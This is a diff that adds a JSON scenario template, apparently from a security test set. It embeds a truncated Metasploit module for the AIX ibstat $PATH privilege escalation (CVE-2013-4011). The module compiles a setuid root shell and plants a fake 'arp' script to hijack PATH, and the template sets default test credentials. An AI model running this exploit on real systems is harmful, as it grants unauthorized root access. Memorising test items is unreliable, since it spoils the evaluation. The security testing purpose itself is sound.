@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_32700",
+  "category": "B2_path_hijack",
+  "attack_technique": "T1574.007",
+  "cwe": "CWE-426",
+  "description": "Linux privilege escalation: ibstat $PATH - Local Privilege Escalation (Metasploit) (CVE-2013-4011;OSVDB-95420)\n\nExploit source code (32700.rb):\n```\n##\n# This module requires Metasploit: http//metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass Metasploit4 < Msf::Exploit::Local\n\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      \"Name\" => \"ibstat $PATH Privilege Escalation\",\n      \"Description\" => %q{\n        This module exploits the trusted $PATH environment variable of the SUID binary \"ibstat\".\n      },\n      \"Author\" => [\n        \"Kristian Erik Hermansen\", #original author\n        \"Sagi Shahar <sagi.shahar[at]mwrinfosecurity.com>\", #Metasploit module\n        \"Kostas Lintovois <kostas.lintovois[at]mwrinfosecurity.com>\" #Metasploit module\n      ],\n      \"References\" => [\n        [\"CVE\", \"2013-4011\"],\n        [\"OSVDB\", \"95420\"],\n        [\"BID\", \"61287\"],\n        [\"URL\", \"http://www-01.ibm.com/support/docview.wss?uid=isg1IV43827\"],\n        [\"URL\", \"http://www-01.ibm.com/support/docview.wss?uid=isg1IV43756\"]\n      ],\n      \"Platform\" => [\"unix\"],\n      \"Arch\" => ARCH_CMD,\n      \"Payload\" => {\n        \"Compat\" => {\n          \"PayloadType\" => \"cmd\",\n          \"RequiredCmd\" => \"perl\"\n        }\n      },\n      \"Targets\" => [\n        [\"IBM AIX Version 6.1\", {}],\n        [\"IBM AIX Version 7.1\", {}]\n      ],\n      \"DefaultTarget\" => 1,\n      \"DisclosureDate\" => \"Sep 24 2013\"\n    ))\n\n    register_options([\n      OptString.new(\"WritableDir\", [true, \"A directory where we can write files\", \"/tmp\"])\n    ], self.class)\n  end\n\n  def check\n    find_output = cmd_exec(\"find /usr/sbin/ -name ibstat -perm -u=s -user root 2>/dev/null\")\n\n    if find_output.include?(\"ibstat\")\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, \"Target is not vulnerable.\")\n    else\n      print_good(\"Target is vulnerable.\")\n    end\n\n    root_file = \"#{datastore[\"WritableDir\"]}/#{rand_text_alpha(8)}\"\n    arp_file = \"#{datastore[\"WritableDir\"]}/arp\"\n    c_file = %Q^#include <stdio.h>\n\nint main()\n{\n   setreuid(0,0);\n   setregid(0,0);\n   execve(\"/bin/sh\",NULL,NULL);\n   return 0;\n}\n^\n    arp = %Q^#!/bin/sh\n\nchown root #{root_file}\nchmod 4555 #{root_file}\n^\n\n    if gcc_installed?\n      print_status(\"Dropping file #{root_file}.c...\")\n      write_file(\"#{root_file}.c\", c_file)\n\n      print_status(\"Compiling source...\")\n      cmd_exec(\"gcc -o #{root_file} #{root_file}.c\")\n      print_status(\"Compilation completed\")\n\n      register_file_for_cleanup(\"#{root_file}.c\")\n    else\n      cmd_exec(\"cp /bin/sh #{root_file}\")\n    end\n\n    register_file_for_cleanup(root_file)\n\n    print_status(\"Writing custom arp file...\")\n    write_file(arp_file,arp)\n    register_file_for_cleanup(arp_file)\n    cmd_exec(\"chmod 0555 #{arp_file}\")\n    print_status(\"Custom arp file written\")\n\n    print_status(\"Updating $PATH environment variable...\")\n    path_env = cmd_exec(\"echo $PATH\")\n    cmd_exec(\n```",
+  "cve": "CVE-2013-4011;OSVDB-95420",
+  "exploitdb_id": "32700",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_32700",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
